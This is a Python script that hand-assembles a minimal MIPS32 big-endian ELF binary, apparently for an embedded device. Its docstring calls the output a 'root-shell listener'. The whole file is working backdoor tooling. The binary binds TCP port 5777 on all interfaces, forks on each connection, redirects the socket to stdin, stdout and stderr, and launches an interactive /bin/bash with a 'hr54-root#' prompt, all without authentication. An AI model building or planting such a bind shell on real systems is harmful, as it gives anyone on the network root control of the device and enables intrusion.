#!/usr/bin/env python3
"""Build a tiny libc-free MIPS32 big-endian o32 root-shell listener."""

from pathlib import Path
import struct

BASE = 0x00400000
CODE_OFF = 0x100
ENTRY = BASE + CODE_OFF
OUT = Path(__file__).resolve().parent / "hr54d"

# Register numbers.
ZERO, V0, A0, A1, A2, A3 = 0, 2, 4, 5, 6, 7
T0, T1 = 8, 9
S0, S1 = 16, 17
SP, RA = 29, 31


def ins_i(op, rs, rt, imm):
    return (op << 26) | (rs << 21) | (rt << 16) | (imm & 0xFFFF)


def ins_r(rs, rt, rd, shamt, fn):
    return (rs << 21) | (rt << 16) | (rd << 11) | (shamt << 6) | fn


class Asm:
    def __init__(self):
        self.words = []
        self.labels = {}
        self.branches = []
        self.jumps = []
        self.addresses = []

    @property
    def pc(self):
        return ENTRY + 4 * len(self.words)

    def emit(self, word):
        self.words.append(word)

    def label(self, name):
        self.labels[name] = self.pc

    def addiu(self, rt, rs, imm):
        self.emit(ins_i(0x09, rs, rt, imm))

    def ori(self, rt, rs, imm):
        self.emit(ins_i(0x0D, rs, rt, imm))

    def lui(self, rt, imm):
        self.emit(ins_i(0x0F, ZERO, rt, imm))

    def li(self, rt, value):
        value &= 0xFFFFFFFF
        signed = value if value < 0x80000000 else value - 0x100000000
        if -32768 <= signed <= 32767:
            self.addiu(rt, ZERO, signed)
        else:
            self.lui(rt, value >> 16)
            self.ori(rt, rt, value)

    def move(self, rd, rs):
        self.emit(ins_r(rs, ZERO, rd, 0, 0x21))

    def sw(self, rt, off, base):
        self.emit(ins_i(0x2B, base, rt, off))

    def syscall(self):
        self.emit(0x0000000C)

    def nop(self):
        self.emit(0)

    def branch(self, op, rs, rt, label):
        at = len(self.words)
        self.emit(0)
        self.branches.append((at, op, rs, rt, label))

    def beq(self, rs, rt, label):
        self.branch(0x04, rs, rt, label)

    def bne(self, rs, rt, label):
        self.branch(0x05, rs, rt, label)

    def jump(self, label):
        at = len(self.words)
        self.emit(0)
        self.jumps.append((at, label))

    def load_addr(self, reg, label):
        hi_at = len(self.words)
        self.lui(reg, 0)
        lo_at = len(self.words)
        self.ori(reg, reg, 0)
        self.addresses.append((hi_at, lo_at, reg, label))

    def finish(self, data_labels):
        labels = dict(self.labels)
        labels.update(data_labels)
        for at, op, rs, rt, label in self.branches:
            pc = ENTRY + 4 * at
            delta = labels[label] - (pc + 4)
            if delta % 4 or not -0x20000 <= delta < 0x20000:
                raise ValueError(f"bad branch to {label}")
            self.words[at] = ins_i(op, rs, rt, delta // 4)
        for at, label in self.jumps:
            self.words[at] = (0x02 << 26) | ((labels[label] >> 2) & 0x03FFFFFF)
        for hi_at, lo_at, reg, label in self.addresses:
            addr = labels[label]
            self.words[hi_at] = ins_i(0x0F, ZERO, reg, addr >> 16)
            self.words[lo_at] = ins_i(0x0D, reg, reg, addr)
        return b"".join(struct.pack(">I", word) for word in self.words)


a = Asm()
a.addiu(SP, SP, -128)

# MIPS keeps the historical BSD socket-type numbering: SOCK_DGRAM is 1 and
# SOCK_STREAM is 2 (unlike the host architecture).  Use the target ABI value.
# socket(AF_INET, SOCK_STREAM, 0) through the MIPS o32 socketcall syscall.
a.li(T0, 2); a.sw(T0, 0, SP)
a.li(T0, 2); a.sw(T0, 4, SP)
a.sw(ZERO, 8, SP)
a.li(A0, 1); a.move(A1, SP); a.li(V0, 4102); a.syscall()
a.bne(A3, ZERO, "fatal"); a.nop()
a.move(S0, V0)

# setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, 4).
a.li(T0, 1); a.sw(T0, 40, SP)
a.sw(S0, 0, SP)
a.li(T0, 0xFFFF); a.sw(T0, 4, SP)
a.li(T0, 4); a.sw(T0, 8, SP)
a.addiu(T0, SP, 40); a.sw(T0, 12, SP)
a.li(T0, 4); a.sw(T0, 16, SP)
a.li(A0, 14); a.move(A1, SP); a.li(V0, 4102); a.syscall()

# bind(listener, 0.0.0.0:5777, sizeof(sockaddr_in)).
a.sw(S0, 0, SP)
a.load_addr(T0, "sockaddr"); a.sw(T0, 4, SP)
a.li(T0, 16); a.sw(T0, 8, SP)
a.li(A0, 2); a.move(A1, SP); a.li(V0, 4102); a.syscall()
a.bne(A3, ZERO, "fatal"); a.nop()

# listen(listener, 8).
a.sw(S0, 0, SP); a.li(T0, 8); a.sw(T0, 4, SP)
a.li(A0, 4); a.move(A1, SP); a.li(V0, 4102); a.syscall()
a.bne(A3, ZERO, "fatal"); a.nop()

a.label("accept_loop")
# Reap one exited child without blocking.
a.li(A0, -1); a.move(A1, ZERO); a.li(A2, 1); a.move(A3, ZERO)
a.li(V0, 4114); a.syscall()

# accept(listener, NULL, NULL).
a.sw(S0, 0, SP); a.sw(ZERO, 4, SP); a.sw(ZERO, 8, SP)
a.li(A0, 5); a.move(A1, SP); a.li(V0, 4102); a.syscall()
a.bne(A3, ZERO, "accept_loop"); a.nop()
a.move(S1, V0)

# fork one shell worker per connection.
a.li(V0, 4002); a.syscall()
a.bne(A3, ZERO, "parent_close"); a.nop()
a.beq(V0, ZERO, "child"); a.nop()

a.label("parent_close")
a.move(A0, S1); a.li(V0, 4006); a.syscall()
a.jump("accept_loop"); a.nop()

a.label("child")
a.move(A0, S0); a.li(V0, 4006); a.syscall()
for fd in (0, 1, 2):
    a.move(A0, S1); a.li(A1, fd); a.li(V0, 4063); a.syscall()
a.move(A0, S1); a.li(V0, 4006); a.syscall()
a.load_addr(A0, "shell")
a.load_addr(A1, "argv")
a.load_addr(A2, "envp")
a.li(V0, 4011); a.syscall()

a.label("fatal")
a.li(A0, 111); a.li(V0, 4001); a.syscall()

# Lay out strings and pointer vectors after the code, aligned to four bytes.
placeholder_code = b"".join(struct.pack(">I", word) for word in a.words)
data_addr = ENTRY + len(placeholder_code)
data = bytearray()
data_labels = {}

def add_blob(name, blob, align=1):
    while len(data) % align:
        data.append(0)
    data_labels[name] = data_addr + len(data)
    data.extend(blob)

add_blob("sockaddr", bytes.fromhex("00021691000000000000000000000000"), 4)
add_blob("shell", b"/bin/bash\0")
add_blob("dash_i", b"-i\0")
add_blob("env_path", b"PATH=/bin:/sbin:/usr/bin:/usr/sbin:/opt/mp4lib/bin\0")
add_blob("env_home", b"HOME=/\0")
add_blob("env_ps1", b"PS1=hr54-root# \0")

while len(data) % 4:
    data.append(0)
add_blob("argv", b"", 4)
data.extend(struct.pack(">III", data_labels["shell"], data_labels["dash_i"], 0))
add_blob("envp", b"", 4)
data.extend(struct.pack(">IIII", data_labels["env_path"], data_labels["env_home"], data_labels["env_ps1"], 0))

code = a.finish(data_labels)
body = bytearray(CODE_OFF)
body.extend(code)
body.extend(data)

ident = b"\x7fELF" + bytes([1, 2, 1, 0]) + bytes(8)
ehdr = struct.pack(">16sHHIIIIIHHHHHH", ident, 2, 8, 1, ENTRY, 52, 0,
                   0x50001007, 52, 32, 1, 0, 0, 0)
phdr = struct.pack(">IIIIIIII", 1, 0, BASE, BASE, len(body), len(body), 7, 0x1000)
body[:52] = ehdr
body[52:84] = phdr
OUT.write_bytes(body)
OUT.chmod(0o755)
print(f"{OUT} {len(body)} bytes entry=0x{ENTRY:x}")
